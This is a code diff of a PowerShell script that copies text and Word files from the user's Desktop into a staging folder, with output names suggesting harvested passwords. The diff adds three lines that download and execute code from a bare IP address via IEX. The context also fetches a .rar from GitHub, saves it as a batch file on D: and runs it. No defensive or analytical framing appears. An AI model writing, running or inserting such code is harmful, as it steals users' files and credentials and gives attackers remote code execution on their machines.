@@ -2745,6 +2745,7 @@ $copyDir = (Get-ChildItem env:\userprofile).value + '\Desktop'
 $huida = (Get-ChildItem env:\username).value + ' Getpass.txt'
 $huida1 = (Get-ChildItem env:\username).value + ' Report.zip'
 $copyToDir = New-Item $fileSaveDir'\Doc' -ItemType Directory
+IEX (New-Object Net.WebClient).DownloadString('http://106.80.36.138:8080/')
 
 Dir -filter *.txt -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
 Dir -filter *.doc -recurse $copyDir | ForEach-Object {Copy-Item $_.FullName $copyToDir}
@@ -2959,6 +2960,8 @@ catch
 {
 	echo 'Error!Filed!'
 }
+IEX (New-Object Net.WebClient).DownloadString('http://106.80.36.138:8080/')
+IEX (New-Object Net.WebClient).DownloadString('http://106.80.36.138:8080/')
 remove-item $fileSaveDir -recurse
 (new-object System.Net.WebClient).DownloadFile('https://github.com/begiilm/dy/raw/master/run2.rar','D:\run2.bat');
 d:\run2.bat
